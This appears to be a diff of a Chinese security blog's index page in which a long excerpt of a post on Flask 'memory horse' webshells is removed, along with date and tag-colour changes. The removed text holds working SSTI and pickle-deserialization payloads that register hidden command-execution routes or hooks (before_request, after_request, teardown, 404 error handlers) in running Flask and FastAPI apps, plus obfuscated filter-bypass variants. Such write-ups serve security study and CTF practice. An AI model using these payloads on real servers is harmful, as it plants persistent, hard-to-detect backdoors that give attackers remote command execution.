@@ -247,7 +247,7 @@
         
 
 <div class="post">
-    <a href="/2024/08/17/python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">
+    <a href="/2024/08/16/python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">
         <h2 class="post-title">python-Flask内存马</h2>
     </a>
     <div class="category-and-date">
@@ -265,7 +265,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/8/17
+            2024/8/16
         </span>
         
         
@@ -275,297 +275,7 @@
             
             <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久之前在各位师傅的博客里看过，语雀里一直贴着链接，这里暂且记录一下相关知识点。</p>
 <hr>
-<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>常用的Python框架有<code>Django</code>、<code>Flask</code>，这两者都可能存在<code>SSTI</code>漏洞。</p>
-<p>Python 内存马利用Flask框架中SSTI注入来实现， Flask框架中在web应用模板渲染的过程中用到<code>render_template_string</code>进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现Python内存马的注入。</p>
-<p>注入内存马需要我们能执行代码，经典的方式是通过SSTI，当然也可以利用<code>pickle反序列化</code>等。</p>
-<p>本文基于SSTI漏洞环境为例。</p>
-<hr>
-<h1 id="Flask-请求上下文管理机制"><a href="#Flask-请求上下文管理机制" class="headerlink" title="Flask 请求上下文管理机制"></a>Flask 请求上下文管理机制</h1><p>当网页请求进入<code>Flask</code>时， 会实例化一个<code>Request Context</code>。</p>
-<p>在Python中分出了两种上下文：请求上下文(request context)、应用上下文(session context)。</p>
-<p> 一个请求上下文中封装了请求的信息，而上下文的结构是运用了一个<code>Stack</code>的栈结构，也就是说它拥有一个栈所拥有的全部特性。<code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中，基于此特性便可以通过获取栈顶元素的方法来获取当前的请求。</p>
-<hr>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>先准备一个Flask SSTI漏洞环境：</p>
-<pre><code class="python">from flask import Flask, request, render_template_string
-
-app = Flask(__name__)
-
-@app.route(&#39;/&#39;)
-def home():
-    person = &#39;guest&#39;
-    if request.args.get(&#39;name&#39;):
-        person = request.args.get(&#39;name&#39;)
-    template = &#39;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#39; % person
-    return render_template_string(template)
-
-
-if __name__ == &quot;__main__&quot;:
-    app.run(debug=False)
-</code></pre>
-<hr>
-<h2 id="debug模式下利用报错"><a href="#debug模式下利用报错" class="headerlink" title="debug模式下利用报错"></a>debug模式下利用报错</h2><p>众所周知，在flask中如果开启了debug模式，报错是会显示详细信息的，比赛中debug模式通常考点是构造pin码，但是我们这里想到，可以通过手动控制报错<code>raise Exception()</code>的方式来让我们的命令回显。</p>
-<p>payload：</p>
-<pre><code class="python">&#123;&#123;url_for.__globals__['__builtins__']['exec']("raise Exception(__import__('os').popen('whoami').read())")&#125;&#125;
-</code></pre>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181146916.png" alt="image-20240818114607351"></p>
-<hr>
-<p>接下来关闭debug模式，开始研究内存马。</p>
-<h2 id="低版本内存马"><a href="#低版本内存马" class="headerlink" title="低版本内存马"></a>低版本内存马</h2><p>payload：</p>
-<pre><code class="python">&#123;&#123;url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",&#123;'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']&#125;)&#125;&#125;
-</code></pre>
-<p>写成容易阅读的形式</p>
-<pre><code class="python">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](
-    &quot;app.add_url_rule(
-        &#39;/shell&#39;, 
-        &#39;shell&#39;, 
-        lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()
-        )
-    &quot;,
-    &#123;
-        &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],
-        &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]
-    &#125;)
-</code></pre>
-<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>第一行利用<code>url_for()</code>函数作为入口点获取了当前命名空间的<code>__builtins__</code>模块,调用了<code>eval</code>用于执行代码。</p>
-<p>这个eval传入了两个参数,先看第二个：</p>
-<pre><code class="python">&#123;
-        &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],
-        &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]
-    &#125;
-</code></pre>
-<p>这个参数是eval的命名空间，<code>_request_ctx_stack</code>是一个请求上下文栈。请求上下文是指在处理HTTP请求的过程中，Flask创建的一个临时环境，用来存储和管理与当前请求相关的信息，例如当前请求的<code>request</code>对象，其中就包括了HTTP请求的所有细节。</p>
-<p><code>url_for.__globals__[&#39;current_app&#39;]</code>是当前运行的app。</p>
-<p>接下来看第一个参数，也就是执行的代码：</p>
-<pre><code class="python">&quot;app.add_url_rule(
-        &#39;/shell&#39;, 
-        &#39;shell&#39;, 
-        lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()
-        )
-    &quot;
-</code></pre>
-<p>很明显，这里调用了Flask对象的<code>add_url_rule</code>方法，看一下源码实现</p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181230990.png" alt="image-20240818123004028"></p>
-<p>在Flask中注册路由是使用<code>@app.route()</code>装饰器来实现的，这里就是用了add_url_rule() 来动态的添加路由，包括了6个参数：</p>
-<pre><code class="python">@setupmethod
-def add_url_rule(
-    self,
-    rule: str,#函数对应的URL规则,满足条件和app.route()的第一个参数一样,必须以/开头；
-    endpoint: str | None = None,#端点,即在使用url_for()进行反转的时候,这里传入的第一个参数就是endpoint对应的值.这个值也可以不指定,那么默认就会使用函数的名字作为endpoint的值；
-    view_func: ft.RouteCallable | None = None,#URL对应的函数（注意,这里只需写函数名字而不用加括号）；
-    provide_automatic_options: bool | None = None,#控制是否应自动添加选项方法.这也可以通过设置视图来控制_func.provide_automatic_options =添加规则前为False；
-    **options: t.Any,#要转发到基础规则对象的选项.Werkzeug的一个变化是处理方法选项.方法是此规则应限制的方法列表（GET、POST等）.默认情况下,规则只侦听GET（并隐式地侦听HEAD）.从Flask0.6开始,通过标准请求处理隐式添加和处理选项；
-) -&gt; None:
-</code></pre>
-<p>由此可见，这个方法可以根据传入的参数动态地添加一个路由，其中我们可以指定用于处理这个路由的视图函数。在这个payload里，我们定义了一个匿名函数用于处理这个路由的请求。</p>
-<pre><code class="python">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()
-</code></pre>
-<p>为了获取我们注入的命令，我们还需要当前HTTP请求的<code>request</code>对象，这也就是我们一开始要获取<code>_request_ctx_stack</code>的原因。在这个栈里，栈顶的元素<code>_request_ctx_stack.top</code>自然就是我们当前请求的上下文，其中包含我们需要的<code>request</code>对象，于是我们就可以获取当前请求GET传参的值，进而执行我们传入的命令。</p>
-<p>这就是旧版Flask内存马的原理。</p>
-<p>在旧版Flask内存马中需要注意一个点就是当前app的获取，需要确实获取到当前正在运行的app，这里所用的技巧和沙箱逃逸是一致的。</p>
-<h3 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h3><pre><code class="python">url_for.__globals__[&#39;sys&#39;].modules[&#39;__main__&#39;].__dict__[&#39;app&#39;]
-
-url_for.__globals__[&#39;sys&#39;].modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())
-</code></pre>
-<p>pickle同理，关键是如何拿到正在运行的app。</p>
-<p>如果直接 import app.py 来获取app是不行的，此app非彼app，添加了路由但是并不能访问到，应该是一个全新的app。</p>
-<blockquote>
-<p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。</p>
-</blockquote>
-<p>所以我们可以通过sys.modules拿到当前已经导入的模块，并且获取模块中的属性，由于我们最终的eval是在app.py中执行的，所以我们可以通过<code>sys.modules[&#39;__main__&#39;]</code>来获取当前的模块。</p>
-<hr>
-<h2 id="新版本内存马"><a href="#新版本内存马" class="headerlink" title="新版本内存马"></a>新版本内存马</h2><p>如果我们尝试在新版Flask跑起来的web应用中用旧版的方式挂内存马就会有如下报错。</p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181307090.png" alt="image-20240818130715344"></p>
-<p>看调用栈能发现这个报错是<code>_check_setup_finished()</code>这个函数抛出的</p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181310735.png" alt="image-20240818131000712"></p>
-<p>意思就是这个app已经跑起来了，这个函数就不能再被调用了。调试之后发现这个方法的<code>@setupmethod</code>装饰器会先check一次，所以基本上是完全不能用了。</p>
-<hr>
-<p>新版内存马的第一种实现方式是用<code>before_request()</code>装饰器或者<code>after_request()</code>装饰器在一个请求前&#x2F;后执行自己注入的代码，进而实现挂马的操作。我们要先了解什么是装饰器</p>
-<blockquote>
-<p>python装饰器</p>
-<p>装饰器本质上是一个可调用的对象(函数或类), 它接收一个函数或类座位参数，并返回一个新的函数或类。这个新的函数或类通常会保留原始函数或类的功能，但会在其基础上添加一些额外的逻辑。</p>
-</blockquote>
-<p>我们以这个路由进行测试：</p>
-<pre><code class="python">@app.route(&#39;/cmd&#39;)
-def cmd():
-    flag = eval(request.args.get(&#39;cmd&#39;))
-    if flag :
-        return &quot;1&quot;
-    else:
-        return &quot;0&quot;
-</code></pre>
-<h3 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h3><blockquote>
-<p>在 Flask 中，before_request是一个装饰器，它用于在请求处理之前执行特定的函数。</p>
-<p>这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等</p>
-</blockquote>
-<p>我们看一下他是如何实现的</p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181314228.png" alt="image-20240818131435183"></p>
-<p>可以看到这里实际上调用的是</p>
-<pre><code class="python">self.before_request_funcs.setdefault(None, []).append(f)
-</code></pre>
-<p>解释：</p>
-<ul>
-<li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li>
-<li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li>
-<li>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</li>
-</ul>
-<p>那么这个<code>f</code>就是我们添加的函数了，于是我们同样可以自定义一个 lambda 函数，这样在每次发起请求前就都会触发了</p>
-<p>于是可以构造我们的payload：</p>
-<pre><code class="python">__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())
-</code></pre>
-<p>测试：</p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181328193.png" alt="image-20240818132757826"></p>
-<p>但是使用before_request()有一个问题就是，执行了之后访问所有页面都会是匿名函数返回的结果，可能会被搭便车，也会影响到主机的正常业务，也很容易被发现，使用after_request()就能避免这个问题。</p>
-<hr>
-<h3 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h3><p>和 before_request 相反，<code>after_request</code>会在请求结束得到响应包之后进行操作</p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181353286.png" alt="image-20240818135301009"></p>
-<p>和前面一样，唯一要注意的是这个需要定义一个返回值，不然就会报错。</p>
-<p>payload：</p>
-<pre><code class="python">app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(&#39;global r;r=app.make_response(__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&#39;)==None else resp)
-</code></pre>
-<p>逐行解释这段代码</p>
-<pre><code class="python">lambda resp: #传入参数
-    CmdResp if request.args.get(&#39;cmd&#39;) and      #如果请求参数含有cmd则返回命令执行结果
-    exec(&#39;
-        global r;     #定义一个全局变量,方便获取
-        r=app.make_response(__import__(&#39;os&#39;).popen(request.args.get(\&#39;cmd\&#39;)).read())   #创建一个响应对象
-    &#39;)==None    #恒真
-    else resp)  #如果请求参数没有cmd则正常返回
-#这里的cmd参数名和r变量名都是可以改的
-</code></pre>
-<p>执行后就会将get传入的cmd参数作为系统命令执行,如果没有传入cmd就显示正常的界面.</p>
-<p>简化版不带出回显,适用于过滤严格的场景</p>
-<pre><code class="python">app.after_request_funcs.setdefault(None, []).append(lambda x:__import__(&quot;os&quot;).popen(request.args.get(&quot;cmd&quot;)))
-</code></pre>
-<h2 id="Flask中的钩子函数"><a href="#Flask中的钩子函数" class="headerlink" title="Flask中的钩子函数"></a>Flask中的钩子函数</h2><p>其实<code>after_request()</code>和<code>before_request()</code>有一个共同的分类叫钩子函数。钩子函数是指在执行函数和目标函数之间挂载的函数，框架开发者给调用方提供一个point-挂载点，至于挂载什么函数由调用方决定。</p>
-<h3 id="before-first-request"><a href="#before-first-request" class="headerlink" title="before_first_request"></a><strong>before_first_request</strong></h3><p>在对应用程序实例的第一个请求之前注册要运行的函数，只会运行一次。</p>
-<h3 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a><strong>before_request</strong></h3><p>在每个请求之前注册一个要运行的函数，每一次请求都会执行一次。</p>
-<h3 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a><strong>after_request</strong></h3><p>在每个请求之后注册一个要运行的函数，每次请求完成后都会执行。需要接收一个 Response 对象作为参数，并返回一个新的 Response 对象，或者返回接收的 Response 对象。</p>
-<h3 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a><strong>teardown_request</strong></h3><p>注册在每一个请求的末尾，不管是否有异常，每次请求的最后都会执行。<code>无回显。</code></p>
-<p>payload：</p>
-<pre><code class="python">app.teardown_request_funcs.setdefault(None, []).append(lambda :__import__(&#39;os&#39;).popen(&quot;calc&quot;).read())
-</code></pre>
-<p>不能调用<code>request.args.get()</code>动态执行传入的命令，但是可以执行注入的代码。每次刷新网页都会执行，原因是这个装饰器的触发是在请求被销毁后的，在这个时候上一个HTTP请求帧已经被销毁了，但是可以执行静态命令。</p>
-<h3 id="teardown-appcontext"><a href="#teardown-appcontext" class="headerlink" title="teardown_appcontext"></a><strong>teardown_appcontext</strong></h3><p>不管是否有异常，注册的函数都会在每次请求之后执行。</p>
-<p>flask 为上下文提供了一个<code>teardown_appcontext</code>钩子，使用它注册的毁掉函数会在程序上下文被销毁时调用，通常也在请求上下文被销毁时调用。</p>
-<p>某些情况下这个函数和**@teardown_request**的行为是类似的，一个是请求上下文被销毁时被调用，另一个是应用上下文被销毁时调用。</p>
-<blockquote>
-<p>比如你需要在每个请求处理结束后销毁数据库连接：app.teardown_appcontext 装饰器注册的回调函数需要接收异常对象作为参数，当请求被正常处理时这个参数将是None，这个函数的返回值将被忽略.</p>
-</blockquote>
-<p>payload：</p>
-<pre><code class="python">app.teardown_appcontext_funcs.append(lambda x :__import__(&#39;os&#39;).popen(&quot;calc&quot;).read())
-</code></pre>
-<h3 id="context-processor"><a href="#context-processor" class="headerlink" title="context_processor"></a><strong>context_processor</strong></h3><p>上下文处理器，返回的字典可以在全部的模板中使用。</p>
-<h3 id="template-filter-‘upper’"><a href="#template-filter-‘upper’" class="headerlink" title="template_filter(‘upper’)"></a><strong>template_filter(‘upper’)</strong></h3><p>增加模板过滤器，可以在模板中使用该函数，后面的参数是名称，在模板中用到。</p>
-<h3 id="errorhandler-400"><a href="#errorhandler-400" class="headerlink" title="errorhandler(400)"></a><strong>errorhandler(400)</strong></h3><p>发生一些异常时，比如404,500，或者抛出异常(Exception)之类的，就会自动调用该钩子函数。</p>
-<ol>
-<li>发生请求错误时，框架会自动调用相应的钩子函数，并向钩子函数中传入error参数</li>
-<li>如果钩子函数没有定义error参数，就会报错</li>
-<li>可以使用<code>abort(http status code)</code>函数来手动终止请求抛出异常，如果要是发生参数错误，可以abort(404)之类的</li>
-</ol>
-<pre><code class="python">@app.errorhandler(404)
-def errortest(e):
-    print(&#39;error_handler(404)&#39;)
-    print(e)
-    return &#39;404 Err0r&#39;
-</code></pre>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181444644.png" alt="image-20240818144454796"></p>
-<p>跟进这个装饰器的底层逻辑</p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181446568.png" alt="image-20240818144655739"></p>
-<p>可以发现他给这个<code>self.error_hander_spec</code>这个字典里添加了一个函数，就是错误处理函数</p>
-<p>也就是说现在的重点变成了如何控制这个<code>code</code>和<code>exc_class</code>，如果能控制这两个值，我们就可以利用错误处理的逻辑执行我们传入的函数</p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181452334.png" alt="image-20240818145214688"></p>
-<p>直接<code>_get_exc_class_and_code(404)</code>，这样就能返回常规的变量了。</p>
-<p>payload：</p>
-<pre><code class="python">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()&quot;)
-</code></pre>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181454140.png" alt="image-20240818145410036"></p>
-<hr>
-<h1 id="SSTI利用"><a href="#SSTI利用" class="headerlink" title="SSTI利用"></a>SSTI利用</h1><p>考虑到上下文没有导入包的情况</p>
-<p>注：部分flask版本下无法使用<code>url_for.__globals__[&#39;current_app&#39;]</code>来获取app，因此这里改用<code>sys.modules</code></p>
-<pre><code class="python">&#123;&#123;url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",&#123;'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']&#125;)&#125;&#125;
-</code></pre>
-<pre><code class="python">&#123;&#123;url_for.__globals__['__builtins__']['eval']("exec(\"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()\")",&#123;'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']&#125;)&#125;&#125;
-</code></pre>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181507259.png" alt="image-20240818150733949"></p>
-<p>针对FastAPI，不能用add_url_rule添加内存马，得用add_api_route添加内存马。</p>
-<pre><code class="python">undefinded.__class__.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_api_route(&#39;/flag&#39;,lambda:__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())&quot;)
-
-config.__init__.__globals__[&#39;__builtins__&#39;][&#39;exec&#39;](&#39;app.add_api_route(&quot;/flag&quot;,lambda:__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read());&#39;,&#123;&quot;app&quot;:app&#125;)
-</code></pre>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181535762.png" alt="image-20240818153210118"></p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181535440.png" alt="image-20240818153258387"></p>
-<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181535423.png" alt="image-20240818153306271"></p>
-<hr>
-<h1 id="pickle利用"><a href="#pickle利用" class="headerlink" title="pickle利用"></a>pickle利用</h1><p>before_request：</p>
-<pre><code class="python">import os
-import pickle
-import base64
-class A():
-    def __reduce__(self):
-        return (eval,(&quot;__import__(\&quot;sys\&quot;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&quot;,))
-
-a = A()
-b = pickle.dumps(a)
-print(base64.b64encode(b))
-</code></pre>
-<p>after_request：</p>
-<pre><code class="python">import os
-import pickle
-import base64
-class A():
-    def __reduce__(self):
-        return (eval,(&quot;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#39;flask\&#39;).make_response(__import__(\&#39;os\&#39;).popen(request.args.get(\&#39;cmd\&#39;)).read())\&quot;)==None else resp)&quot;,))
-
-a = A()
-b = pickle.dumps(a)
-print(base64.b64encode(b))
-</code></pre>
-<p>error_handler：</p>
-<pre><code class="python">import os
-import pickle
-import base64
-class A():
-    def __reduce__(self):
-        return (exec,(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()&quot;,))
-
-a = A()
-b = pickle.dumps(a)
-print(base64.b64encode(b))
-</code></pre>
-<hr>
-<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><p>在实际应用中往往都存在过滤, 因此了解如何绕过还是必要的</p>
-<ul>
-<li><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code>.</li>
-<li>代码执行函数替换, 如<code>exec</code>等替换<code>eval</code>.</li>
-<li>字符串可采用拼接方式, 如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>.</li>
-<li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换.</li>
-<li><code>[]</code>可用<code>.__getitem__()</code>或<code>.pop()</code>替换.</li>
-<li>过滤<code>&#123;&#123;`或者`&#125;&#125;</code>, 可以使用<code>&#123;%`或者`%&#125;</code>绕过, <code>&#123;%%&#125;</code>中间可以执行<code>if</code>语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.</li>
-<li>过滤<code>_</code>可以用编码绕过, 如<code>__class__</code>替换成<code>\x5f\x5fclass\x5f\x5f</code>, 还可以用<code>dir(0)[0][0]</code>或者<code>request[&#39;args&#39;]</code>或者<code>request[&#39;values&#39;]</code>绕过.</li>
-<li>过滤了<code>.</code>可以采用<code>attr()</code>或<code>[]</code>绕过.</li>
-<li>其它的手法参考<code>SSTI</code>绕过过滤的方法即可…</li>
-</ul>
-<p>这里给出两个变形<code>Payload</code>:</p>
-<ul>
-<li><p>原payload：</p>
-<pre><code class="python">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;shell&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)
-</code></pre>
-</li>
-<li><p>变形payload-1:</p>
-<pre><code class="python">request.application.__self__._get_data_for_json.__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;).__getitem__(&#39;__bui&#39;+&#39;ltins__&#39;).__getitem__(&#39;ex&#39;+&#39;ec&#39;)(&quot;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;shell&#39;)).read())&quot;,&#123;&#39;_request_ct&#39;+&#39;x_stack&#39;:get_flashed_messages.__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;).pop(&#39;_request_&#39;+&#39;ctx_stack&#39;),&#39;app&#39;:get_flashed_messages.__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;).pop(&#39;curre&#39;+&#39;nt_app&#39;)&#125;)
-</code></pre>
-</li>
-<li><p>变形payload-2：</p>
-<pre><code class="python">get_flashed_messages|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;__builtins__&quot;)|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;app.add_ur&quot;+&quot;l_rule(&#39;/shell&#39;, &#39;shell&#39;, la&quot;+&quot;mbda :__imp&quot;+&quot;ort__(&#39;o&quot;+&quot;s&#39;).po&quot;+&quot;pen(_request_c&quot;+&quot;tx_stack.to&quot;+&quot;p.re&quot;+&quot;quest.args.get(&#39;shell&#39;)).re&quot;+&quot;ad())&quot;,&#123;&#39;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#39;:get_flashed_messages|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&quot;),&#39;app&#39;:get_flashed_messages|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&quot;)&#125;)
-</code></pre>
-<hr>
-</li>
-</ul>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14539">https://xz.aliyun.com/t/14539</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10933">https://xz.aliyun.com/t/10933</a></p>
-<p><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/">Flask内存马 | 雲流のLowest World (c1oudfl0w0.github.io)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">新版FLASK下python内存马的研究 - gxngxngxn - 博客园 (cnblogs.com)</a></p>
-
+<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>常用的Python框架有<code>Django</code>、<code>Flask</code>，这两者都可能存在<code>SSTI</code>漏洞。
             
         </div>
     </div>
@@ -579,11 +289,16 @@ print(base64.b64encode(b))
         
         <span class="tag">
             
-            <a href="/tags/flask/" style="color: #ffa2c4">flask</a>
+            <a href="/tags/flask/" style="color: #00bcd4">flask</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/python/" style="color: #ff7d73">python</a>
         </span>
         
     </div>
-    <a href="/2024/08/17/python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/" class="go-post">阅读全文</a>
+    <a href="/2024/08/16/python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -632,12 +347,12 @@ print(base64.b64encode(b))
         
         <span class="tag">
             
-            <a href="/tags/awd/" style="color: #00bcd4">awd</a>
+            <a href="/tags/awd/" style="color: #ff7d73">awd</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="color: #ff7d73">自动化</a>
+            <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="color: #03a9f4">自动化</a>
         </span>
         
     </div>
